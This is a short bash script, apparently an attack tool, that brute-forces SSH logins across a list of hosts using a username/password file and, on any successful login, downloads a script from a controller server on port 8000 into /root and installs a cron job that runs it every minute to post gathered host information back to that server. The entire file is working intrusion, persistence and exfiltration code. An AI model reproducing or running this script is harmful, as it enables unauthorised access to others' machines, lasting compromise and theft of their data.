#!/bin/bash

userpass_csv="userpass.csv"
ports_csv="open_ports.csv"

command1="curl http://$1:8000/source/getscript/ > /root/gatherinfo.sh"
command2='(crontab -l ; echo "*/1     *       *       *       *       source /root/gatherinfo.sh http://'"$1"':8000/panel/postinfo/") | crontab -'

while IFS=',' read -r line
do
    port=$(echo "$line" | cut -d',' -f2 | cut -d'/' -f1)
    ip=$(echo "$line" | cut -d',' -f1 | sed 's/[()]//g')
    
    if [ $port = "22" ]
    then
        echo "Brute-forcing SSH on $ip:$port"
        state="0"
        while IFS=',' read -r username password
        do
            sshpass -p "$password" ssh -oStrictHostKeyChecking=no -p "$port" "$username"@"$ip" "$command1 && $command2" 2> /dev/null
            if [ $? = "0" ]
            then
                state="1"
                echo "SSH Successful\!| $username:$password"
            fi
        done < "$userpass_csv"
        if [ $state = "0" ]
        then
            echo "SSH Failed\!"
        fi
    fi
done < "$ports_csv"
